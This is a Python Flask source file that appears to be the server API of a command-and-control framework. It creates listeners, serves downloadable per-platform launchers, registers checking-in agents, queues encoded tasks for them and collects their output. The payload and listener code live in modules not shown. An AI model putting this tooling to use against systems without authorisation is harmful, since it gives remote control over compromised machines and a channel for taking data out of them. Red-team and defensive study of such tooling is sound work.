import io
from base64 import b64decode
from datetime import datetime
from sqlalchemy import asc

from . import json_encoder
from .render_launcher import render_launcher
from flask import Flask, jsonify, request, abort, send_file
from ..database import db_session, db_init
from ..database.models import Agent, Task, TaskResult, Listener
from .listener_manager import ListenerManager

listener_manager = ListenerManager()

app = Flask(__name__)

app.json_encoder = json_encoder.SQLAlchemyEncoder

db_init()

for listener in Listener.query.all():
    listener_manager.create_listener(listener)

@app.route("/listeners/", methods=['GET'])
def listeners():
    return jsonify(Listener.query.all())

@app.route("/listeners/", methods=['POST'])
def listeners_post():
    listener_d = request.json
    sym_key = b64decode(listener_d['sym_key'])
    listener = Listener(
        type=listener_d.get('type'),
        bind_host=listener_d.get('bind_host'),
        bind_port=listener_d.get('bind_port'),
        target_host=listener_d.get('target_host'),
        target_port=listener_d.get('target_port'),
        connection_interval_ms=listener_d.get('connection_interval_ms'),
        sym_key=sym_key
    )
    db_session.add(listener)
    db_session.commit()
    listener_manager.create_listener(listener)
    return jsonify(listener)

@app.route("/listeners/<int:id>", methods=['GET'])
def listener(id: int):
    listener = Listener.query.get(id)
    return jsonify(listener) if listener is not None else abort(404)

@app.route("/listeners/<int:id>", methods=['DELETE'])
def listener_delete(id: int):
    listener_manager.delete_listener(id)
    Listener.query.filter_by(id=id).delete()
    return jsonify({'success': True})

@app.route("/listeners/<int:id>/launcher/<platform>", methods=['GET'])
def listener_launcher(id: int, platform: str):
    listener = Listener.query.get(id)
    if listener is None: return abort(404)
    launcher_bytes = render_launcher(listener, platform)
    return send_file(
        io.BytesIO(launcher_bytes),
        mimetype='application/octet-stream',
        as_attachment=True,
        attachment_filename='launcher-{}'.format(platform)
    )


@app.route("/agents/", methods=['GET'])
def agents():
    return jsonify(Agent.query.all())

@app.route("/agents/<id>/report", methods=['POST'])
def agents_ping(id: str):
    agent = Agent.query.get(id)
    report_d = request.json

    if agent is None:
        print('New agent reported in: {}'.format(id))
        agent = Agent(id=id)

    agent.listener_id = report_d['listener_id']
    agent.last_seen_at = datetime.now()

    db_session.add(agent)
    db_session.commit()

    return jsonify(agent)

@app.route("/agents/<id>", methods=['GET'])
def agent(id: str):
    agent = Agent.query.get(id)
    return jsonify(agent) if agent is not None else abort(404)

@app.route("/agents/<agent_id>/tasks/", methods=['GET'])
def agent_tasks(agent_id: str):
    tasks = Task.query.filter_by(agent_id=agent_id).all()
    return jsonify(tasks)

@app.route("/agents/<agent_id>/tasks/unread/", methods=['GET'])
def agent_tasks_unread(agent_id: str):
    agent = Agent.query.get(agent_id)
    tasks = Task.query \
                .filter_by(agent_id=agent_id) \
                .filter(Task.id > agent.last_task_id) \
                .order_by(asc(Task.id)) \
                .all()

    if len(tasks) > 0:
        agent.last_task_id = tasks[-1].id
        db_session.add(agent)
        db_session.commit()

    return jsonify(tasks)

@app.route("/agents/<agent_id>/tasks/", methods=['POST'])
def agent_tasks_post(agent_id: str):
    task_d = request.json
    input_encoded = task_d.get('input')
    task = Task(
        agent_id=agent_id,
        type=task_d.get('type'),
        info=task_d.get('info'),
        input=b64decode(input_encoded) if input_encoded is not None else None
    )
    db_session.add(task)
    db_session.commit()
    return jsonify(task)

@app.route("/agents/<agent_id>/tasks/<int:task_id>/result", methods=['GET'])
def agent_task_result(agent_id: str, task_id: int):
    task_result = TaskResult.query.filter_by(task_id=task_id).all()
    return jsonify(task_result)

@app.route("/agents/<agent_id>/tasks/<int:task_id>/result", methods=['POST'])
def agent_task_result_post(agent_id: str, task_id: int):
    task_result_d = request.json
    output_encoded = task_result_d.get('output')
    task_result = TaskResult(
        task_id=task_id,
        info=task_result_d.get('info'),
        output=b64decode(output_encoded) if output_encoded is not None else None 
    )
    db_session.add(task_result)
    db_session.commit()
    return jsonify(task_result)

@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()